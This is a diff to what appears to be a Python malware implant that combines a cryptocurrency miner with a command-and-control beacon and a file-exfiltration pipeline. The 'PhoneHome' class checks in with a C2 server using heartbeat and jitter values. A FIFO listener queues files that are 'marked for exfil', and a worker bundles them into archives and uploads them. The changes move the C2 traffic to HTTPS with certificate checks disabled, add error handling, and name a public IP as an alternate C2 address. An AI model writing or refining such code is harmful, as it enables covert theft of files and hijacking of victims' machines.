@@ -10,6 +10,9 @@ import tarfile
 import os
 import threading
 import json
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # below value should be 0 (CPU @ ~20%) or 1 (CPU quiet, slows payoff)
 target = 3000000000000000000000000000000000000000000000  # just for testing
@@ -24,20 +27,29 @@ PIPE = "/tmp/fifo"  # FIFO path for file exfiltration
 class PhoneHome:
     heartbeat = 30
     jitter = 15
-    home_url = "http://localhost:8888/kk"
-    # home_url = 'http://192.168.37.129:8888/kk'
+    home_url = "https://localhost:8888/kk"
+    # home_url = 'https://104.53.222.47:8888/kk'
 
     def __init__(self):
         super().__init__()
 
     def CallHome(self, MinerID):  # heartbeat check-in with C2
         payload = {"miner_id": MinerID}
-        r = requests.post(self.home_url + "/beacon", json=payload)
-        if r.status_code != 200:
-            raise ValueError(r.json())
-        p = r.json()
-        PhoneHome.heartbeat = p["h"]
-        PhoneHome.jitter = p["j"]
+        try:
+            r = requests.post(
+                self.home_url + "/beacon",
+                json=payload,
+                verify=False,
+            )
+            if r.status_code != 200:
+                raise ValueError(r.json())
+            p = r.json()
+            PhoneHome.heartbeat = p["h"]
+            PhoneHome.jitter = p["j"]
+        except ConnectionError as e:
+            print(f"Connection error: {e}")
+        except ValueError as e:
+            print(f"Value error: {e}")
 
     def CallCoin(self, CoinResult, MinerID):  # send a coin result to bank
         payload = {"miner_id": MinerID, "coin_result": CoinResult}
@@ -109,36 +121,39 @@ file_buffer = FileStack(idle_timeout=10)
 def watch_and_bundle(mid):
     while True:
         time.sleep(5)
-#       print("Checking for idle state...")
+        #       print("Checking for idle state...")
         if file_buffer.is_idle() and file_buffer.stack:
             archive = file_buffer.bundle_files()
-#           print(f"Bundled files to {archive}, sending to server...")
+            #           print(f"Bundled files to {archive}, sending to server...")
             with open(archive, "rb") as f:
                 files = {
                     "upload": (archive, f, "application/gzip"),
                     "metadata": (None, json.dumps({"uuid": mid})),
                 }
                 requests.post(
-                    "http://localhost:8888/kk/upload",
+                    "https://localhost:8888/kk/upload",
                     files=files,
+                    verify=False,
                 )
             os.remove(archive)
 
 
 def fifo_listener(pipe_path, file_buffer):
-#   print(f"[+] Starting FIFO listener on {pipe_path}")
+    #   print(f"[+] Starting FIFO listener on {pipe_path}")
     if not os.path.exists(pipe_path):
         os.mkfifo(pipe_path)
         print(f"[+] FIFO created at {pipe_path}")
 
-#   print(f"[+] Listening to FIFO at {pipe_path}")
+    #   print(f"[+] Listening to FIFO at {pipe_path}")
     while True:
         with open(pipe_path, "r") as pipe:
             for line in pipe:
                 filepath = line.strip()
                 if os.path.isfile(filepath):
-#                   print(f"[+] Marked for exfil: {filepath}")
+                    #                   print(f"[+] Marked for exfil: {filepath}")
                     file_buffer.add_file(filepath)
+
+
 #                else:
 #                   print(f"[-] Not a file or doesn't exist: {filepath}")
 
